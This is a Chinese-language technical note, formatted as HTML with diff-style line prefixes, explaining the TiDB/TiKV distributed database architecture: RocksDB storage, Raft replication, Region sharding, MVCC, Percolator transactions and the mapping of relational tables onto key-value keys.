+<h2><a class="anchor" aria-hidden="true" id="技术第一生产力"></a><a href="#技术第一生产力" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>技术第一生产力</h2>
+<h2><a class="anchor" aria-hidden="true" id="技术管理者视野"></a><a href="#技术管理者视野" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>技术管理者视野</h2>
+<h2><a class="anchor" aria-hidden="true" id="专业决定高度"></a><a href="#专业决定高度" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>专业决定高度</h2>
+<h2><a class="anchor" aria-hidden="true" id="团队如何知人"></a><a href="#团队如何知人" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>团队如何知人</h2>
+<h2><a class="anchor" aria-hidden="true" id="以己为尺度"></a><a href="#以己为尺度" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>以己为尺度</h2>
+<h2><a class="anchor" aria-hidden="true" id="架构师的自我修炼"></a><a href="#架构师的自我修炼" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>架构师的自我修炼</h2>
+<h2><a class="anchor" aria-hidden="true" id="格局重要性"></a><a href="#格局重要性" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>格局重要性</h2>
+<h2><a class="anchor" aria-hidden="true" id="培养大格局大局观"></a><a href="#培养大格局大局观" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>培养大格局大局观</h2>
+<h1><a class="anchor" aria-hidden="true" id="tidb"></a><a href="#tidb" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>TiDB</h1>
+<h2><a class="anchor" aria-hidden="true" id="数据存储"></a><a href="#数据存储" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>数据存储</h2>
+<p>数据库最根本的功能是能把数据存下来，如何保存数据？</p>
+<p>保存数据的方法很多，最简单的方法是直接在内存中建一个数据结构，保存用户发来的数据。比如用一个数组，每当收到一条数据就向数组中追加一条记录。方案简单，能满足最基本要求，并且性能肯定会很好。存在问题：数据完全在内存中，一旦停机或者是服务重启，数据就会永久丢失。</p>
+<h3><a class="anchor" aria-hidden="true" id="数据丢失？"></a><a href="#数据丢失？" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>数据丢失？</h3>
+<p><strong>为了解决数据丢失问题</strong>，可以把数据放在非易失存储介质（比如硬盘）中。改进的方案是在磁盘上创建一个文件，收到一条数据，就在文件中Append一行。OK，我们现在有了一个能持久化存储数据的方案。但是还不够好，假设这块磁盘出现了坏道呢？我们可以做RAID（Redundant
+Array of Independent
+Disks，磁盘阵列，有&quot;独立磁盘构成的具有冗余能力的阵列&quot;之意），提供单机冗余存储。如果整台机器都挂了呢？比如出现了火灾，RAID也保不住这些数据。我们还可以将存储改用网络存储，或者是通过硬件或者软件进行<strong>存储复制</strong>。到这里似乎我们已经解决了数据安全问题，可以松一口气了。But，做复制过程中是否能保证副本之间的一致性？也就是在保证数据不丢的前提下，还要保证数据不错。保证数据不丢不错只是一项最基本的要求，还有更多令人头疼的问题等待解决：</p>
+<p>能否支持跨数据中心的容灾？</p>
+<p>写入速度是否够快？</p>
+<p>数据保存下来后，是否方便读取？</p>
+<p>保存的数据如何修改？如何支持并发的修改？</p>
+<p>如何原子地修改多条记录？</p>
+<p>这些问题每一项都非常难，但是要做一个优秀的数据存储系统，必须要解决上述的每一个难题。
+TiKV项目就是为了解决数据存储问题。</p>
+<h3><a class="anchor" aria-hidden="true" id="key-value：数据存储模型"></a><a href="#key-value：数据存储模型" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Key-Value：数据存储模型</h3>
+<p>数据存储模型，也就是数据以什么样的形式保存下来。TiKV选择的是key-value模型，并且提供有序遍历方法。</p>
+<p>对于TiKV：</p>
+<ol>
+<li><p>这是一个巨大的Map，也就是存储的是Key-Value pair</p></li>
+<li><p>Key和Value都是Byte数组，Key按照Byte数组总的原始二进制比特位顺序排列。可以Seek到某一个Key的位置，然后不断的调用Next方法以递增是顺序获取比这个Key大的Key-Value</p></li>
+</ol>
+<h3><a class="anchor" aria-hidden="true" id="rocksdb：存储引擎"></a><a href="#rocksdb：存储引擎" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>RocksDB：存储引擎</h3>
+<p>任何持久化的存储引擎，数据终归是要保存在磁盘上。TiKV没有选择直接向磁盘上写数据，而是把数据保存在RocksDB中，具体的数据落地由RocksDB负责。</p>
+<p>RocksDB是一个非常优秀的开源单机存储引擎，可以满足对单机引擎的各种要求，由Facebook团队维护，是一个单机的Key-Value
+Map。</p>
+<h3><a class="anchor" aria-hidden="true" id="解决单机失效问题：raft"></a><a href="#解决单机失效问题：raft" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>解决单机失效问题：Raft</h3>
+<p>如何保证单机失效的情况下，数据不丢失？简单来说，我们需要想办法把数据复制到多台机器上，这样一台机器挂了，我们还有其他的机器上的副本；复杂来说，我们还需要这个复制方案是可靠、高效并且能处理副本失效的情况。Raft一致性协议。</p>
+<p>Raft是一个一致性协议，提供几个重要的功能：Leader选举、成员变更、日志复制</p>
+<p>TiKV利用Raft来做数据复制，每个数据变更都会落地为一条Raft日志，通过Raft的日志复制功能，将数据安全可靠地同步到Group的多数节点中。</p>
+<p><img src="media/image93.png" alt="aft">{width=&quot;2.0516207349081363in&quot;
+height=&quot;1.5025787401574804in&quot;}</p>
+<p>①通过单机的RocksDB，我们可以将数据快速地存储在磁盘上</p>
+<p>②通过Raft，我们可以将数据复制到多台机器上，以防单机失效</p>
+<p>③数据的写入是通过Raft这一层的接口写入，而不是直接写RocksDB</p>
+<p>④通过实现Raft，我们拥有了一个分布式的KV，现在再也不用担心某台机器挂掉了。</p>
+<p>仍然存在的问题：Key-Value非常巨大，如果每个单节点上都保存所有的数据，扩展性就会变差，而且很容易有瓶颈问题，也无法解决传统数据库遇到的问题，所以<strong>数据还需要分片。</strong></p>
+<p>对于一个KV系统，将数据分散在多台机器上有两种比较典型的方案：</p>
+<p>一：按照Key做Hash</p>
+<p>根据Hash值选择对应的存储节点。Redis
+Cluster采用这种形式，数据CRC16%16384分配到不同的Solt。其实Solt又根据Range分配到了不同的主机</p>
+<p>二：分Range</p>
+<p>某一段连续的Key都保存在一个存储节点上</p>
+<p>TiKV选择了第二种方式，将整个Key-Value空间分成很多段，每一段是一系列连续的Key，我们将每一段叫做一个Region，并且我们会尽量保持每个Region中保存的数据不超过一定的大小（这个大小可以配置，目前默认是64mb）。每一个Region都可以用StartKey到EndKey这样一个左闭右开区间来描述。</p>
+<p><img src="media/image94.png" alt="egion">{width=&quot;1.8166568241469816in&quot;
+height=&quot;1.645138888888889in&quot;}<img src="media/image95.png" alt="">{width=&quot;3.847916666666667in&quot;
+height=&quot;1.9118186789151357in&quot;}</p>
+<p>将数据划分成Region后，需要：</p>
+<p>①以Region为单位，将数据分散在集群中所有的节点上，并且尽量保证每个节点上服务的Region数量差不多</p>
+<p>数据按照Key切分成很多Region，每个Region的数据只会保存在一个节点上面。有一个组件（PD
+server）来负责将Region尽可能均匀的散布在集群中所有的节点上，这样一方面实现了存储容量的水平扩展（增加新的节点后，会自动将其他节点上的Region调度过来），另一方面也实现了负载均衡（不会出现某个节点有很多数据，其他节点上没什么数据的情况）。同时为了保证上层客户端能够访问所需要的数据，也会有一个组件（PD
+server）记录Region在节点上面的分布情况，也就是通过任意一个Key就能查询到这个Key在哪个Region中，以及这个Region目前在哪个节点上。</p>
+<p>②以Region为单位做Raft的复制和成员管理</p>
+<p>也就是一个Region的数据会保存多个副本，我们将每一个副本叫做一个Replica。Replica之间是通过Raft来保持数据的一致，一个Region的多个Replica会保存在不同的节点上，构成一个RaftGroup。其中一个Replica会作为这个Group的Leader，其他的Replica作为Follower。<strong>所有的读和写都是通过Leader进行，再由Leader复制给Follower</strong>。</p>
+<h3><a class="anchor" aria-hidden="true" id="数据多版本控制（mvcc）"></a><a href="#数据多版本控制（mvcc）" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>数据多版本控制（MVCC）</h3>
+<p>TiKV的MVCC实现是通过在Key后面添加Version来实现。</p>
+<p><img src="media/image96.png" alt="">{width=&quot;2.2645833333333334in&quot;
+height=&quot;1.3294881889763779in&quot;}</p>
+<p>对于同一个Key的多个版本，我们把版本号较大的放在前面，版本号小的放在后面，这样当用户通过一个Key+Version来获取Value的时候，可以将Key和Version构造出MVCC的Key，也就是Key-Version。然后可以直接Seek(Key-Version)，定位到第一个大于等于这个Key-Version的位置。</p>
+<h3><a class="anchor" aria-hidden="true" id="事务"></a><a href="#事务" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>事务</h3>
+<p>TiKV的事务采用的是Percolator模型，并且做了大量的优化。TiKV的事务采用乐观锁，事务的执行过程中，不会检测写写冲突，只有在提交过程中，才会做冲突检测，冲突的双方中比较早完成提交的会写入成功，另一方会尝试重新执行整个事务。当业务的写入冲突不严重的情况下，这种模型性能会很好，比如随机更新表中某一行的数据，并且表很大。但是如果业务的写入冲突严重，性能就会很差，举一个极端的例子，就是计数器，多个客户端同时修改少量行，导致冲突严重的，造成大量的无效重试。</p>
+<h2><a class="anchor" aria-hidden="true" id="计算"></a><a href="#计算" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>计算</h2>
+<h3><a class="anchor" aria-hidden="true" id="关系模型到key-value模型的映射"></a><a href="#关系模型到key-value模型的映射" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>关系模型到Key-Value模型的映射</h3>
+<p>可以将关系模型简单理解为Table和SQL语句，那么问题变为如何在KV结构上保存Table以及如何在KV结构上运行SQL语句。假设我们有这样一个表的定义：</p>
+<p>CREATE TABLE User {</p>
+<p>ID int,</p>
+<p>Name varchar (20),</p>
+<p>Role varchar (20),</p>
+<p>Age int,</p>
+<p>PRIMARY KEY(ID),</p>
+<p>Key idxAge(age)</p>
+<p>};</p>
+<h3><a class="anchor" aria-hidden="true" id="整体的需求描述"></a><a href="#整体的需求描述" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>整体的需求描述</h3>
+<p>SQL和KV结构之间存在巨大的区别，如何能够方便高效地进行映射，就成为一个很重要的问题。一个好的映射方案必须有利于对数据操作的需求。那么我们先看一下对数据的操作有哪些需求，分别有哪些特点。</p>
+<p>对于一个Table来说，需要存储的数据包括三部分：表的元信息、Table中的Row、索引数据</p>
+<p>表的元信息保存在后面章节介绍。对于Row，可以选择行存或者列存，这两种各有优缺点。TiDB面向的首要目标是OLTP业务，这类业务需要支持快速地读取、保存、修改、删除一行数据，所以采用行存是比较合适的。</p>
+<p>对于Index，TiDB不止需要支持Primary Index，还需要支持Secondary
+Index。Index的作用的辅助查询，提升查询性能，以及保证某些Constraint。查询的时候有两种模式，一种是点查，比如通过Primary
+Key或者Unique Key的等值条件进行查询，如<em>select name from user where
+id=1;</em>，这种需要通过索引快速定位到某一行数据；另一种是Range查询，如<em>select
+name from user where age &gt; 30 and age &lt;
+35;</em>，这个时候需要通过idxAge索引查询age在30和35之间的那些数据。Index还分为Unique
+Index和非Unique Index，这两种都需要支持。</p>
+<p>这些数据的操作需求，主要考虑Insert/Update/Delete/Select这四种语句。</p>
+<p>对于Insert语句，需要将Row写入KV，并且建立好索引数据。</p>
+<p>对于Update语句，需要将Row更新的同时，更新索引数据（如果有必要）。</p>
+<p>对于Delete语句，需要在删除Row的同时，将索引也删除。</p>
+<p>对于Select语句，情况会复杂一些。首先我们需要能够简单快速地读取一行数据，所以每个Row需要有一个ID（显示或隐式的ID）。其次可能会读取连续多行数据，比如<em>select
+* from
+user;</em>。最后还有通过索引读取数据的需求，对索引的使用可能是点查或者是范围查询。</p>
+<h3><a class="anchor" aria-hidden="true" id="tidb如何实现"></a><a href="#tidb如何实现" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>TiDB如何实现</h3>
+<p>TiDB对每个表分配一个TableID，每一个索引都会分配一个IndexID，每一行分配一个RowID（如果表有整数型的Primary
+Key，那么会用Primary
+Key的值当做RowID），其中TableID在整个集群内唯一，IndexID/RowID在表内唯一，这些ID都是int64类型。</p>
+<p>数据存储：</p>
+<p>Key: tablePrefix{tableID}_recordPrefixSep{rowID}</p>
+<p>Value: [col1, col2, col3, col4]</p>
+<p>Unique Index存储：</p>
+<p>Key: tablePrefix{tableID}_indexPrefixSep{indexID}_indexedColumnsValue</p>
+<p>Value: rowID</p>
+<p>非Unique Index存储：</p>
+<p>Key:
+tablePrefix{tableID}_indexPrefixSep{indexID}_indexedColumnsValue_rowID</p>
+<p>Value: null</p>
+<p>var(</p>
+<p>tablePrefix = []byte{'t'}</p>
+<p>recordPrefixSep = []byte(&quot;_r&quot;)</p>
+<p>indexPrefixSep = []byte(&quot;_i&quot;)</p>
+<p>)</p>
+<p>这样，无论是Row还是Index的Key编码方案，一个Table内部所有的Row都有相同的前缀，一个Index的数据也都有相同的前缀。这样具有相同前缀的数据，在TiKV的Key空间内，是排列在一起。这种保证编码前和编码后的比较关系不变的方案我们称为Memcomparable，对于任何类型的值，两个对象编码前的原始类型比较结果，和编码成byte数组后（注意，TiKV中的Key和Value都是原始的byte数组）的比较结果保持一致。具体的编码方案参见TiDB的codec包。采用这种编码后，一个表的所有Row数据就会按照RowID的顺序排列在TiKV的Key空间中，某一个Index的数据也会按照Index的ColumnValue顺序排列在Key空间内。</p>
+<p>示例：</p>
+<p><img src="media/image97.png" alt="">{width=&quot;7.263888888888889in&quot;
+height=&quot;0.9868055555555556in&quot;}</p>
+<h3><a class="anchor" aria-hidden="true" id="元信息管理"></a><a href="#元信息管理" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>元信息管理</h3>
+<p>Database/Table都有元信息，也就是其定义以及各项属性，这些信息也需要持久化，我们也将这些信息存储在TiKV中。每个Database/Table都被分配了一个唯一的ID，这个ID作为唯一标识，并且在编码为Key-Value时，这个ID都会编码到Key中，再加上m_前缀。这样可以构造出一个Key，Value中存储的是序列化后的元信息。除此之外，还有一个专门的Key-Value存储当前Schema信息的版本。TiDB使用GoogleF1的OnlineSchema变更算法，有一个后台线程在不断的检查TiKV上面存储的Schema版本是否发生变化，并且保证在一定时间内一定能够获取版本的变化（如果确实发生了变化）。</p>
+<p><strong>SQL on KV 架构</strong></p>
+<p><img src="media/image98.png" alt="">{width=&quot;3.5145833333333334in&quot;
+height=&quot;1.6420428696412948in&quot;}</p>
+<p>TiKV
+Cluster主要作用是作为KV引擎存储数据。TiDBServer，为SQL层，这一层的节点都是无状态的节点，本身并不存储数据，节点之间完全对等。TiDBServer这一层最重要的工作是处理用户请求，执行SQL运算逻辑。</p>
